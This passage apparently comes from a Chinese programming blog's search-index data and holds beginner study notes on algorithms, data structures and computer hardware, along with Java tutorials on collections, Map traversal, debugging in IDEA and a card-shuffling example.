算法: 运行有限的时间 有限的存储空间 得到正确的结果 算法不等于程序,也不等于计算方法,是两者的结合。 特征： 可行性 确定性（并且在任何条件下，算法都只有一条执行路径） 有穷性 拥有足够的情报 算法的基本结构： 对数据的运算操作(算数，逻辑) 算法的控制结构： 顺序结构 条件结构（分支结构） 循环结构 描述算法： 传统流程图 N-S结构化流程图（盒图） 自然语言 伪代码 一个算法可以用三种基本控制结构组合而成 算法设计方法 列举法：列举所有可能 归纳法：从特殊到一般 递归法：函数的自调用 递推法：从条件到结论 减半递推：分治 回溯：反证 算法的复杂度 算法复杂度可以分为： 时间复杂度 空间复杂度 算法的时间复杂度（和时间没有关系） 算法的计算工作量： 用算法所执行的基本运算次数来度量。 基本运算次数：是问题规模的函数 算法的计算工作量= f ( n )，其中n是问题的规模 分析算法工作量的方法： 平均性态（把每次运行程序执行的基本次数平均下来） 最坏情况复杂性（可能选最小，也可能选最大） 算法的空间复杂度 执行这个算法所需要的存储空间或者内存空间。 数据结构的基本概念 数据元素之间固有的逻辑关系，既数据的逻辑结构 数据中出现物理两个字,说明数据和计算机中的存放位置或地址有关系 数据的逻辑结构 数据结构是指带有结构的数据元素集合 结构是指数据元素之间前后件关系 一个数据结构包含两种信息： 数据元素的信息 数据元素之间的前后件关系。 数据的逻辑结构是指反映数据元素之间逻辑关系的数据结构。 数据的存储结构 数据的逻辑结构在计算机存储空间中存放的形式称为存储结构（也称数据的物理结构） 数据的存储结构存放： 数据元素的信息 数据元素之间的前后件关系 一种数据的逻辑结构,可以拥有多种物理结构（存储结构） 数据的物理结构不会影响数据本身的逻辑结构 采用不同的存储结构，则数据处理的效率是不同的 数据结构的表示： 二元关系表示 图形表示 数据结构分为线性结构和非线性结构。 数据元素有时候也称为节点或结点 最后一个节点称为叶子节点 线性结构（线性表）： 有且只有一个根节点 有且只有一个叶子节点 除根节点外，其他节点均只有一个前件（前继） 除叶子节点外，其他节点均只有一个后件（后继） 线性表示指n个数据元素的有限序列。 当n=0时，称为空表 线性表的顺序存储结构： 存储空间是连续的 按逻辑顺序依次存放的 在长度为n的线性表顺序存储结构中插入一个数,最坏情况下需要移动n个数 在长度为n的线性表顺序存储结构中删除一个数,最坏情况下需要移动n-1个数 考题 算法的空间复杂度与算法所处理的数据存储空间有关。 设数据集合为D={1,2,3,4,5,6}。 B=（D,R）中为非线性结构的是 R={（1,2），（2,3），（4,3），(3,5) } 其中R代表关系 数据的存储结构会影响算法的效率。 线性表的顺序存储结构中，其存储空间连续，各个元素所占字节数相同，元素的存储顺序与逻辑顺序一致。 时间复杂度与所用的计算工具无关。 算法设计必须考虑算法的复杂度。 算法必须能在有限个步骤之后终止。 算法强调动态的执行过程，不同于静态的计算公式。","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"计算机硬件系统","slug":"002计算机硬件系统","date":"2020-04-18T07:54:42.000Z","updated":"2020-04-19T18:43:01.225Z","comments":true,"path":"2020/04/18/002计算机硬件系统/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/18/002计算机硬件系统/","excerpt":"","text":"计算机硬件系统 以前冯诺依曼计算机结构以运算器为中心 现在以存储器为中心 计算机硬件系统主要包括: 中央处理器 内存储器 输入输出设备 它们通过总线相连接到一起 中央处理器: 运算器:对数据进行算术运算符,逻辑运算 控制器:对指令分析,控制,协调输入输出,对内存访问 存储器: 存储程序和数据 内存储器 外存储器 输入设备: 将程序和数据输入到计算机中 输出设备: 将用户信息(程序或数据)输出到外部输出设备供用户查看. 中央处理器 也叫CPU,计算机的核心部件。 负责执行软件指令将数据加工成信息。 CPU分为两部分： 控制器 运算器（算术逻辑单元） 它们都包含有寄存器和高速存储区域，用总线连接起来。 控制器： 计算机的控制中心和指挥中心 对于每个指令，控制单元都要执行4个基本操作 取指令 分析指令 执行指令 存储结果 运算器: 可以执行算数运算,逻辑运算 算数运算: +,-,*,/ 逻辑运算: ＞,≥,＜,≤,=,≠ 寄存器: 提高计算机性能 高速存储区域 临时存储数据和指令或内存地址 寄存器的大小和数量可以决定计算机的性能和速度 寄存器的类型 指令寄存器 地址寄存器 存储寄存器 累加寄存器等 总线: 在CPU内部或CPU和主板中其他部件进行信息传输的电子数据线路 通道越多,位的传输越快. 例如32位总线一次可以传输32位数据信息 CPU品质的高低，是主频和字长 主时钟： 控制CPU工作的节拍 不断产生固定频率的时钟 主时钟的频率就是主频 主频越高，运算速度越快 字长：CPU可以同时处理二进制的位数 CPU还可以通过总线访问各种输入输出设备 计算机的基本工作原理 计算机指令格式 计算机指令是能够被识别和执行的二进制代码 指令由两部分组成： 操作码 操作数（地址码） 操作码二进制位数决定了最多可以有多少种操作 操作的最多总数：2k ,其中k代表二进制位数 n种操作至少拥有的位数:[log2(n - 1)] + 1 , 其中[ ] 代表取整. 地址码: 操作对象 操作数 存储地址 寄存器 操作数: 源操作数: 本身带有的 目的操作数: 计算出来的结果 操作数一般称为地址码 有的指令只有操作码没有地址码,例如暂停指令 单字节指令: 一个字节的指令 双字节指令: 两个字节的指令 操作数和操作码所占的n个字节称为n字节指令 计算机指令的寻址方式 有效地址: 寻址方式和形式地址决定的 寻址方式: 本条指令的数据地址以及下一条将要执行的指令地址 寻址方式分两种: 指令寻址 数据寻址 指令寻址: 顺序寻址 跳跃寻址 数据寻址: 立即寻址 直接寻址 隐含寻址 间接寻址 寄存器寻址等 计算机指令系统 指令系统: 本计算机所有指令的集合 指令系统共有的功能: 数据传送指令 数据处理指令 程序控制指令 输入/输出指令 其他指令(对计算机的硬件进行管理、堆栈操作等) 计算机执行指令的基本过程 程序是解决实际问题的计算机指令的集合 程序计数器：决定了指令的执行顺序，某个程序被载入内存的时候，会将程序的第一条指令的内存单元地址赋值给程序计数器。 执行程序指令的过程 取指令 分析指令 执行指令 修改程序计数器 指令周期：完成一条指令所费的时间，越短越快 指令执行的时序 机器周期：在内存中读取一个指令字的最短时间 取指令必须占用一个机器周期 存储器","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"计算机的发展历程","slug":"001计算机的发展历程","date":"2020-04-18T06:53:12.000Z","updated":"2020-04-18T07:53:21.591Z","comments":true,"path":"2020/04/18/001计算机的发展历程/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/18/001计算机的发展历程/","excerpt":"","text":"概述 计算机的发展历程 ENIAC: 1946年 美国宾夕法尼亚大学 18000个电子管,1500个继电器 30吨 170㎡ 耗电140kW 每秒加法计算5000次 发展分为4个阶段: 电子管计算时代 晶体管计算机时代 集成电路计算机时代 大规模集成电路计算机时代 计算机体系结构 存储程序控制的计算机结构. EDSAC是第一台存储程序的计算机 存储程序思想是冯诺依曼提出的,概括了: 计算机(硬件)由运算器,存储器,控制器,输入输出设备五大基本部件组成. 计算机内部采用二进制来表示指令和数据 将编好的程序和源数据放在存储器中,再启动计算机工作. 非冯诺依曼结构计算机: 数据流计算机 归约计算机 智能计算机 计算机系统基本组成 分为硬件系统和软件系统. 计算机软件: 在硬件设备上运行的各种程序、数据。 程序：指挥计算机完成各种任务的指令集合。 为了方便阅读和修改程序，会提供关于程序的说明和资料，称为文档 裸机（硬件系统），只能识别机器代码 硬件系统和软件系统是相互依赖，不可分割的。 软件系统：运行，管理，维护计算机编制的程序，数据和文档的总称。 计算机软件分为： 系统软件（控制，协调计算机，外部设备，应用软件开发和运行）：主要负责调度，监控，维护计算机系统 操作系统 语言处理系统 数据库管理系统 系统辅助处理程序 应用软件 信息管理软件 辅助设计软件 文字处理软件 图形软件 各种程序包","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"模拟斗地主洗牌发牌(有序版本)","slug":"java00195模拟斗地主洗牌发牌","date":"2020-04-05T16:52:57.000Z","updated":"2020-04-05T16:57:29.087Z","comments":true,"path":"2020/04/06/java00195模拟斗地主洗牌发牌/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00195模拟斗地主洗牌发牌/","excerpt":"","text":"模拟斗地主洗牌发牌(有序版本) 按照斗地主的规则，完成洗牌发牌的动作。 具体规则： 组装54张扑克牌将 54张牌顺序打乱 三个玩家参与游戏，三人交替摸牌，每人17张牌，最后三张留作底牌。 查看三人各自手中的牌（按照牌的大小排序）、底牌 规则：手中扑克牌从大到小的摆放顺序：大王,小王,2,A,K,Q,J,10,9,8,7,6,5,4,3 案例需求分析 准备牌： 完成数字与纸牌的映射关系： 使用双列Map(HashMap)集合，完成一个数字与字符串纸牌的对应关系(相当于一个字典)。 洗牌： 通过数字完成洗牌发牌 发牌： 将每个人以及底牌设计为ArrayList&lt;String&gt;,将最后3张牌直接存放于底牌，剩余牌通过对3取模依次发牌。 存放的过程中要求数字大小与斗地主规则的大小对应。 将代表不同纸牌的数字分配给不同的玩家与底牌。 看牌： 通过Map集合找到对应字符展示。 通过查询纸牌与数字的对应关系，由数字转成纸牌字符串再进行展示。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122package com.itheima.demo06.Test;import java.util.ArrayList;import java.util.Collections;import java.util.HashMap;import java.util.List;/* 斗地主综合案例:有序版本 1.准备牌 2.洗牌 3.发牌 4.排序 5.看牌 */public class DouDiZhu &#123; public static void main(String[] args) &#123; //1.准备牌 //创建一个Map集合,存储牌的索引和组装好的牌 HashMap&lt;Integer,String&gt; poker = new HashMap&lt;&gt;(); //创建一个List集合,存储牌的索引 ArrayList&lt;Integer&gt; pokerIndex = new ArrayList&lt;&gt;(); //定义两个集合,存储花色和牌的序号 List&lt;String&gt; colors = List.of(\"♠\", \"♥\", \"♣\", \"♦\"); List&lt;String&gt; numbers = List.of(\"2\", \"A\", \"K\", \"Q\", \"J\", \"10\", \"9\", \"8\", \"7\", \"6\", \"5\", \"4\", \"3\"); //把大王和小王存储到集合中 //定义一个牌的索引 int index = 0; poker.put(index,\"大王\"); pokerIndex.add(index); index++; poker.put(index,\"小王\"); pokerIndex.add(index); index++; //循环嵌套遍历两个集合,组装52张牌,存储到集合中 for (String number : numbers) &#123; for (String color : colors) &#123; poker.put(index,color+number); pokerIndex.add(index); index++; &#125; &#125; //System.out.println(poker); //System.out.println(pokerIndex); /* 2.洗牌 使用Collections中的方法shuffle(List) */ Collections.shuffle(pokerIndex); //System.out.println(pokerIndex); /* 3.发牌 */ //定义4个集合,存储玩家牌的索引,和底牌的索引 ArrayList&lt;Integer&gt; player01 = new ArrayList&lt;&gt;(); ArrayList&lt;Integer&gt; player02 = new ArrayList&lt;&gt;(); ArrayList&lt;Integer&gt; player03 = new ArrayList&lt;&gt;(); ArrayList&lt;Integer&gt; diPai = new ArrayList&lt;&gt;(); //遍历存储牌索引的List集合,获取每一个牌的索引 for (int i = 0; i &lt;pokerIndex.size() ; i++) &#123; Integer in = pokerIndex.get(i); //先判断底牌 if(i&gt;=51)&#123; //给底牌发牌 diPai.add(in); &#125;else if(i%3==0)&#123; //给玩家1发牌 player01.add(in); &#125;else if(i%3==1)&#123; //给玩家2发牌 player02.add(in); &#125;else if(i%3==2)&#123; //给玩家3发牌 player03.add(in); &#125; &#125; /* 4.排序 使用Collections中的方法sort(List) 默认是升序排序 */ Collections.sort(player01); Collections.sort(player02); Collections.sort(player03); Collections.sort(diPai); /* 5.看牌 调用看牌的方法 */ lookPoker(\"刘德华\",poker,player01); lookPoker(\"周润发\",poker,player02); lookPoker(\"周星驰\",poker,player03); lookPoker(\"底牌\",poker,diPai); &#125; /* 定义一个看牌的方法,提高代码的复用性 参数: String name:玩家名称 HashMap&lt;Integer,String&gt; poker:存储牌的poker集合 ArrayList&lt;Integer&gt; list:存储玩家和底牌的List集合 查表法: 遍历玩家或者底牌集合,获取牌的索引 使用牌的索引,去Map集合中,找到对应的牌 */ public static void lookPoker(String name,HashMap&lt;Integer,String&gt; poker,ArrayList&lt;Integer&gt; list)&#123; //输出玩家名称,不换行 System.out.print(name+\":\"); //遍历玩家或者底牌集合,获取牌的索引 for (Integer key : list) &#123; //使用牌的索引,去Map集合中,找到对应的牌 String value = poker.get(key); System.out.print(value+\" \"); &#125; System.out.println();//打印完每一个玩家的牌,换行 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Debug追踪","slug":"java00194Debug追踪","date":"2020-04-05T16:46:44.000Z","updated":"2020-04-05T16:51:17.906Z","comments":true,"path":"2020/04/06/java00194Debug追踪/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00194Debug追踪/","excerpt":"","text":"Debug追踪 使用IDEA的断点调试功能，查看程序的运行过程 Debug调试程序: 可以让代码逐行执行,查看代码执行的过程,调试程序中出现的bug 使用方式: 在行号的右边,鼠标左键单击,添加断点(每个方法的第一行,哪里有bug添加到哪里) 右键,选择Debug执行程序 程序就会停留在添加的第一个断点处 执行程序: f8:逐行执行程序 f7:进入到方法中 shift+f8:跳出方法 f9:跳到下一个断点,如果没有下一个断点,那么就结束程序 ctrl+f2:退出debug模式,停止程序 Console:切换到控制台 在有效代码行，点击行号右边的空白区域，设置断点，程序执行到断点将停止，我们可以手动来运行程序 点击Debug运行模式 ​ 程序停止在断点上不再执行，而IDEA最下方打开了Debug调试窗口 Debug调试窗口介绍 快捷键F8，代码向下执行一行,第九行执行完毕，执行到第10行（第10行还未执行） 切换到控制台面板，控制台显示 请录入一个字符串： 并且等待键盘录入 快捷键F8，程序继续向后执行，执行键盘录入操作，在控制台录入数据 ababcea 回车之后效果： 调试界面效果： 此时到达findChar方法，快捷键F7，进入方法findChar 快捷键F8 接续执行，创建了map对象，变量区域显示 快捷键F8 接续执行，进入到循环中，循环变量i为 0,F8再继续执行，就获取到变量c赋值为字符‘a’ 字节值97 快捷键F8 接续执行，进入到判断语句中，因为该字符 不在Map集合键集中，再按F8执行，进入该判断中 快捷键F8 接续执行，循环结束，进入下次循环，此时map中已经添加一对儿元素 快捷键F8 接续执行，进入下次循环，再继续上面的操作，我们就可以看到代码每次是如何执行的了 如果不想继续debug,那么可以使用快捷键F9,程序正常执行到结束，程序结果在控制台显示","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"JDK9对集合添加的优化","slug":"java00193JDK9对集合添加的优化","date":"2020-04-05T16:42:04.000Z","updated":"2020-04-05T16:45:27.481Z","comments":true,"path":"2020/04/06/java00193JDK9对集合添加的优化/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00193JDK9对集合添加的优化/","excerpt":"","text":"JDK9对集合添加的优化 JDK9的新特性: List接口,Set接口,Map接口:里边增加了一个静态的方法of,可以给集合一次性添加多个元素 static &lt;E&gt; List&lt;E&gt; of(E… elements) 使用前提: 当集合中存储的元素的个数已经确定了,不在改变时使用 注意: 1.of方法只适用于List接口,Set接口,Map接口,不适用于接接口的实现类 2.of方法的返回值是一个不能改变的集合,集合不能再使用add,put方法添加元素,会抛出异常 3.Set接口和Map接口在调用of方法的时候,不能有重复的元素,否则会抛出异常 12345678910111213141516171819202122232425package com.itheima.demo04.JDK9;import java.util.List;import java.util.Map;import java.util.Set;public class Demo01JDK9 &#123; public static void main(String[] args) &#123; List&lt;String&gt; list = List.of(\"a\", \"b\", \"a\", \"c\", \"d\"); System.out.println(list);//[a, b, a, c, d] //list.add(\"w\");//UnsupportedOperationException:不支持操作异常 //Set&lt;String&gt; set = Set.of(\"a\", \"b\", \"a\", \"c\", \"d\");//IllegalArgumentException:非法参数异常,有重复的元素 Set&lt;String&gt; set = Set.of(\"a\", \"b\", \"c\", \"d\"); System.out.println(set); //set.add(\"w\");//UnsupportedOperationException:不支持操作异常 //Map&lt;String, Integer&gt; map = Map.of(\"张三\", 18, \"李四\", 19, \"王五\", 20,\"张三\",19); //IllegalArgumentException:非法参数异常,有重复的元素 Map&lt;String, Integer&gt; map = Map.of(\"张三\", 18, \"李四\", 19, \"王五\", 20); System.out.println(map);//&#123;王五=20, 李四=19, 张三=18&#125; //map.put(\"赵四\",30);//UnsupportedOperationException:不支持操作异常 &#125;&#125; 需要注意以下两点： 1:of()方法只是Map，List，Set这三个接口的静态方法，其父类接口和子类实现并没有这类方法，比如 HashSet，ArrayList等待； 2:返回的集合是不可变的；","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Hashtable集合","slug":"java00192Hashtable集合","date":"2020-04-05T16:37:33.000Z","updated":"2020-04-05T16:40:30.624Z","comments":true,"path":"2020/04/06/java00192Hashtable集合/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00192Hashtable集合/","excerpt":"","text":"Hashtable集合 java.util.Hashtable&lt;K,V&gt;集合 implements Map&lt;K,V&gt;接口 Hashtable:底层也是一个哈希表,是一个线程安全的集合,是单线程集合,速度慢 HashMap:底层是一个哈希表,是一个线程不安全的集合,是多线程的集合,速度快 HashMap集合(之前学的所有的集合):可以存储null值,null键 Hashtable集合,不能存储null值,null键 Hashtable和Vector集合一样,在jdk1.2版本之后被更先进的集合(HashMap,ArrayList)取代了 Hashtable的子类Properties依然活跃在历史舞台 Properties集合是一个唯一和IO流相结合的集合 1234567891011121314151617181920package com.itheima.demo03.Map;import java.util.HashMap;import java.util.Hashtable;public class Demo02Hashtable &#123; public static void main(String[] args) &#123; HashMap&lt;String,String&gt; map = new HashMap&lt;&gt;(); map.put(null,\"a\"); map.put(\"b\",null); map.put(null,null); System.out.println(map);//&#123;null=null, b=null&#125; Hashtable&lt;String,String&gt; table = new Hashtable&lt;&gt;(); //table.put(null,\"a\");//NullPointerException //table.put(\"b\",null);//NullPointerException table.put(null,null);//NullPointerException &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map集合练习","slug":"java00191Map集合练习","date":"2020-04-05T16:32:25.000Z","updated":"2020-04-05T16:35:37.011Z","comments":true,"path":"2020/04/06/java00191Map集合练习/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00191Map集合练习/","excerpt":"","text":"Map集合练习 练习: 计算一个字符串中每个字符出现次数 分析: 1.使用Scanner获取用户输入的字符串 2.创建Map集合,key是字符串中的字符,value是字符的个数 3.遍历字符串,获取每一个字符 4.使用获取到的字符,去Map集合判断key是否存在 key存在: 通过字符(key),获取value(字符个数) value++ put(key,value)把新的value存储到Map集合中 key不存在: put(key,1) 5.遍历Map集合,输出结果 12345678910111213141516171819202122232425262728293031323334package com.itheima.demo03.Map;import java.util.HashMap;import java.util.Scanner;public class Demo03MapTest &#123; public static void main(String[] args) &#123; //1.使用Scanner获取用户输入的字符串 Scanner sc = new Scanner(System.in); System.out.println(\"请输入一个字符串:\"); String str = sc.next(); //2.创建Map集合,key是字符串中的字符,value是字符的个数 HashMap&lt;Character,Integer&gt; map = new HashMap&lt;&gt;(); //3.遍历字符串,获取每一个字符 for(char c :str.toCharArray())&#123; //4.使用获取到的字符,去Map集合判断key是否存在 if(map.containsKey(c))&#123; //key存在 Integer value = map.get(c); value++; map.put(c,value); &#125;else&#123; //key不存在 map.put(c,1); &#125; &#125; //5.遍历Map集合,输出结果 for(Character key :map.keySet())&#123; Integer value = map.get(key); System.out.println(key+\"=\"+value); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"LinkedHashMap","slug":"java00190LinkedHashMap","date":"2020-04-05T16:29:14.000Z","updated":"2020-04-05T16:31:14.118Z","comments":true,"path":"2020/04/06/java00190LinkedHashMap/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00190LinkedHashMap/","excerpt":"","text":"LinkedHashMap java.util.LinkedHashMap&lt;K,V&gt; entends HashMap&lt;K,V&gt; Map 接口的哈希表和链接列表实现，具有可预知的迭代顺序。 底层原理: 哈希表+链表(记录元素的顺序) 1234567891011121314151617181920212223package com.itheima.demo03.Map;import java.util.HashMap;import java.util.LinkedHashMap;public class Demo01LinkedHashMap &#123; public static void main(String[] args) &#123; HashMap&lt;String,String&gt; map = new HashMap&lt;&gt;(); map.put(\"a\",\"a\"); map.put(\"c\",\"c\"); map.put(\"b\",\"b\"); map.put(\"a\",\"d\"); System.out.println(map);// key不允许重复,无序 &#123;a=d, b=b, c=c&#125; LinkedHashMap&lt;String,String&gt; linked = new LinkedHashMap&lt;&gt;(); linked.put(\"a\",\"a\"); linked.put(\"c\",\"c\"); linked.put(\"b\",\"b\"); linked.put(\"a\",\"d\"); System.out.println(linked);// key不允许重复,有序 &#123;a=d, c=c, b=b&#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"HashMap存储自定义类型键值","slug":"java00189HashMap存储自定义类型键值","date":"2020-04-05T16:06:03.000Z","updated":"2020-04-05T16:28:40.833Z","comments":true,"path":"2020/04/06/java00189HashMap存储自定义类型键值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00189HashMap存储自定义类型键值/","excerpt":"","text":"HashMap存储自定义类型键值 HashMap存储自定义类型键值 Map集合保证key是唯一的: 作为key的元素,必须重写hashCode方法和equals方法,以保证key唯一 当给HashMap中存放自定义对象时，如果自定义对象作为key存在，这时要保证对象唯一，必须复写对象的hashCode和equals方法(如果忘记，请回顾HashSet存放自定义对象)。 如果要保证map中存放的key和取出的顺序一致，可以使用java.util.LinkedHashMap集合来存放。 12345678910111213141516171819public class HashMapTest &#123; public static void main(String[] args) &#123; //1,创建Hashmap集合对象。 Map&lt;Student,String&gt;map = new HashMap&lt;Student,String&gt;(); //2,添加元素。 map.put(newStudent(\"lisi\",28), \"上海\"); map.put(newStudent(\"wangwu\",22), \"北京\"); map.put(newStudent(\"zhaoliu\",24), \"成都\"); map.put(newStudent(\"zhouqi\",25), \"广州\"); map.put(newStudent(\"wangwu\",22), \"南京\"); //3,取出元素。键找值方式 Set&lt;Student&gt;keySet = map.keySet(); for(Student key: keySet)&#123; Stringvalue = map.get(key); System.out.println(key.toString()+\".....\"+value); &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package com.itheima.demo02.Map;import java.util.HashMap;import java.util.Map;import java.util.Set;public class Demo01HashMapSavePerson &#123; public static void main(String[] args) &#123; show02(); &#125; /* HashMap存储自定义类型键值 key:Person类型 Person类就必须重写hashCode方法和equals方法,以保证key唯一 value:String类型 可以重复 */ private static void show02() &#123; //创建HashMap集合 HashMap&lt;Person,String&gt; map = new HashMap&lt;&gt;(); //往集合中添加元素 map.put(new Person(\"女王\",18),\"英国\"); map.put(new Person(\"秦始皇\",18),\"秦国\"); map.put(new Person(\"普京\",30),\"俄罗斯\"); map.put(new Person(\"女王\",18),\"毛里求斯\"); //使用entrySet和增强for遍历Map集合 Set&lt;Map.Entry&lt;Person, String&gt;&gt; set = map.entrySet(); for (Map.Entry&lt;Person, String&gt; entry : set) &#123; Person key = entry.getKey(); String value = entry.getValue(); System.out.println(key+\"--&gt;\"+value); &#125; &#125; /* HashMap存储自定义类型键值 key:String类型 String类重写hashCode方法和equals方法,可以保证key唯一 value:Person类型 value可以重复(同名同年龄的人视为同一个) */ private static void show01() &#123; //创建HashMap集合 HashMap&lt;String,Person&gt; map = new HashMap&lt;&gt;(); //往集合中添加元素 map.put(\"北京\",new Person(\"张三\",18)); map.put(\"上海\",new Person(\"李四\",19)); map.put(\"广州\",new Person(\"王五\",20)); map.put(\"北京\",new Person(\"赵六\",18)); //使用keySet加增强for遍历Map集合 Set&lt;String&gt; set = map.keySet(); for (String key : set) &#123; Person value = map.get(key); System.out.println(key+\"--&gt;\"+value); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类里定义的接口和使用","slug":"java00188类里定义的接口和使用","date":"2020-04-04T18:06:00.000Z","updated":"2020-04-04T18:25:09.202Z","comments":true,"path":"2020/04/05/java00188类里定义的接口和使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/05/java00188类里定义的接口和使用/","excerpt":"","text":"类里定义的接口和使用 格式: 123456public class 类名&#123; //在类里面定义接口 修饰符 interface 接口名&#123; //抽象方法; &#125;&#125; 123456public class TestA&#123; //在类里面定义接口 private interface A&#123; public abstract void show(); &#125;&#125; 实现接口: 在类方法中用new实现,通过多态接收 123456789101112131415161718public class TestA&#123; //在类里面定义接口 //如果接口修饰符石private,那么此接口只能在本类中使用. public interface A&#123; public abstract void show(); &#125; public void show()&#123; A a = new A()&#123; @Override public void show() &#123; System.out.println(\"111111\"); &#125; &#125;; a.show(); &#125;&#125; 在new的时候实现 1234567891011121314package com.itheima.demo11;public class DemoClass&#123; public static void main(String[] args) &#123; TestA.A a = new TestA.A()&#123; @Override public void show()&#123; System.out.println(\"我是TestA类中的A接口\"); &#125; &#125;; a.show(); &#125;&#125; 在其他类中实现 12345678package com.itheima.demo11;public class TestB implements TestA.A&#123; @Override public void show() &#123; &#125;&#125; 在本类中的内部类实现 123456789101112public class TestA&#123; //在类里面定义接口 private interface A&#123; public abstract void show(); &#125; public class TestC implements A&#123; @Override public void show() &#123; &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map集合遍历键值对方式","slug":"java00187Map集合遍历键值对方式","date":"2020-04-04T17:27:12.000Z","updated":"2020-04-04T17:30:07.198Z","comments":true,"path":"2020/04/05/java00187Map集合遍历键值对方式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/05/java00187Map集合遍历键值对方式/","excerpt":"","text":"Map集合遍历键值对方式 键值对方式：即通过集合中每个键值对(Entry)对象，获取键值对(Entry)对象中的键与值。 操作步骤与图解： 获取Map集合中，所有的键值对(Entry)对象，以Set集合形式返回。方法提示:entrySet()。 遍历包含键值对(Entry)对象的Set集合，得到每一个键值对(Entry)对象。 通过键值对(Entry)对象，获取Entry对象中的键与值。 方法提示:getkey() getValue() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package com.itheima.demo01.Map;import java.util.HashMap;import java.util.Iterator;import java.util.Map;import java.util.Set;/* Map集合遍历的第二种方式:使用Entry对象遍历 Map集合中的方法: Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet() 返回此映射中包含的映射关系的 Set 视图。 实现步骤: 1.使用Map集合中的方法entrySet(),把Map集合中多个Entry对象取出来,存储到一个Set集合中 2.遍历Set集合,获取每一个Entry对象 3.使用Entry对象中的方法getKey()和getValue()获取键与值 */public class Demo03EntrySet &#123; public static void main(String[] args) &#123; //创建Map集合对象 Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); map.put(\"赵丽颖\",168); map.put(\"杨颖\",165); map.put(\"林志玲\",178); //1.使用Map集合中的方法entrySet(),把Map集合中多个Entry对象取出来,存储到一个Set集合中 Set&lt;Map.Entry&lt;String, Integer&gt;&gt; set = map.entrySet(); //2.遍历Set集合,获取每一个Entry对象 //使用迭代器遍历Set集合 Iterator&lt;Map.Entry&lt;String, Integer&gt;&gt; it = set.iterator(); while(it.hasNext())&#123; Map.Entry&lt;String, Integer&gt; entry = it.next(); //3.使用Entry对象中的方法getKey()和getValue()获取键与值 String key = entry.getKey(); Integer value = entry.getValue(); System.out.println(key+\"=\"+value); &#125; System.out.println(\"-----------------------\"); for(Map.Entry&lt;String,Integer&gt; entry:set)&#123; //3.使用Entry对象中的方法getKey()和getValue()获取键与值 String key = entry.getKey(); Integer value = entry.getValue(); System.out.println(key+\"=\"+value); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Entry键值对对象","slug":"java00186Entry键值对对象","date":"2020-04-04T17:24:08.000Z","updated":"2020-04-04T17:25:55.727Z","comments":true,"path":"2020/04/05/java00186Entry键值对对象/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/05/java00186Entry键值对对象/","excerpt":"","text":"Entry键值对对象 我们已经知道，Map中存放的是两种对象，一种称为key(键)，一种称为value(值)，它们在在Map中是一一对应关系，这一对对象又称做Map中的一个Entry(项)。Entry将键值对的对应关系封装成了对象。即键值对对象，这样我们在遍历Map集合时，就可以从每一个键值对（Entry）对象中获取对应的键与对应的值。 既然Entry表示了一对键和值，那么也同样提供了获取对应键和对应值得方法： public K getKey()：获取Entry对象中的键。 public V getValue()：获取Entry对象中的值。 在Map集合中也提供了获取所有Entry对象的方法： public Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet(): 获取到Map集合中所有的键值对对象的集合(Set集合)。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map集合遍历键找值方式","slug":"java00185Map集合遍历键找值方式","date":"2020-04-04T15:47:55.000Z","updated":"2020-04-04T15:52:24.366Z","comments":true,"path":"2020/04/04/java00185Map集合遍历键找值方式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/04/java00185Map集合遍历键找值方式/","excerpt":"","text":"Map集合遍历键找值方式 键找值方式：即通过元素中的键，获取键所对应的值 分析步骤： 获取Map中所有的键，由于键是唯一的，所以返回一个Set集合存储所有的键。方法提示:keyset() 遍历键的Set集合，得到每一个键。 根据键，获取键所对应的值。方法提示:get(K key) 